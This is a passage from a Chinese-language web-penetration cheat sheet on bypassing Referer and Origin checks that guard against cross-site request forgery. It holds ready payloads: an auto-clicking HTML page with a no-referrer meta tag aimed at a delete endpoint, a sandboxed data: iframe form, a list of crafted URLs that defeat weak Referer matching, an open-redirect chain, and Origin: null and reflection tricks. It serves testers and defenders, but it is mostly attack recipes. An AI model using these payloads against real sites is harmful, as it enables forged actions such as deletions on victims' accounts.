## 六、Referer/Origin校验绕过

### 6.1 无Referer/空Referer绕过
```html
<!-- meta referrer=no-referrer -->
<meta name="referrer" content="no-referrer">
<a href="https://target.com/api/delete?id=123" id="x">click</a>
<script>document.getElementById('x').click();</script>

<!-- Referrer-Policy响应头策略由目标决定；攻击者页面可自控meta -->
<!-- data:/blob: URL、iframe sandbox、srcdoc发送请求通常无Referer -->
<iframe src="data:text/html,<form action='https://target.com/api/delete' method='POST'>...</form>"></iframe>
<!-- 若服务端"Referer缺失即放行" → 直接绕过 -->
```

### 6.2 Referer包含匹配绕过（弱正则）
```
校验逻辑若为 contains("target.com") / startsWith("https://target.com") / regex 误写：
1. https://target.com.attacker.com          → 子域包含
2. https://attacker.com/target.com          → 路径包含
3. https://attacker.com?u=https://target.com → 查询参数包含
4. https://attacker.com#target.com          → hash包含
5. https://<EMAIL-REDACTED>          → @前为userinfo，host是attacker.com
6. https://target.com.evil.com              → 前缀匹配
7. https://target.comm.attacker.com         → 前缀+后缀字符
8. IDN同形字（homograph）：punycode校验与显示不一致
```

### 6.3 Open Redirect联动（Referer显示同源）
```
1. 目标有open redirect: https://target.com/redirect?url=<attacker>
2. 构造CSRF：先访问 https://target.com/redirect?url=https://target.com/api/delete
   中间跳转请求的Referer为target.com（同源）→ 通过校验
3. 若redirect白名单宽松（允许任意URL），甚至可直接链到攻击者页面保持Referer为target.com
注意：现代浏览器Referer默认发送"源+路径"（strict-origin-when-cross-origin），跨源跳转时Referer可能被裁剪为仅源——需实测
```

### 6.4 Origin校验绕过
```
1. Origin: null（iframe sandbox/srcdoc/data:）→ 服务端白名单null则直接过
2. 删除Origin头（旧浏览器/代理/curl）→ "缺失即放行"缺陷
3. Origin反射：服务端把Origin原样放入ACAO（CORS缺陷联动，见第九章）
4. 多Origin头/大小写/尾斜杠/端口差异处理缺陷
5. 校验用Origin判断但跨域请求中Origin为`https://target.com.attacker.com`时的正则缺陷（同6.2）
```

